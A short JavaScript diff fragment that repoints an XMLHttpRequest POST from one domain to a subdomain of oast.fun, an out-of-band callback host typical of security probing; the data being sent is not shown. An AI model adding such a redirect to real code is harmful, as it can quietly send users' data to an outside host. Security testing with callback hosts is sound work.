@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open('POST', 'https://imran.com', true);
+xhr.open('POST', 'https://bartqtkbajnhmsotmlzp2mapscgdyaf8s.oast.fun', true);
 xhr.setRequestHeader('Content-type', 'application/json');
 xhr.onload = () => {
     const data = JSON.parse(xhr.responseText);
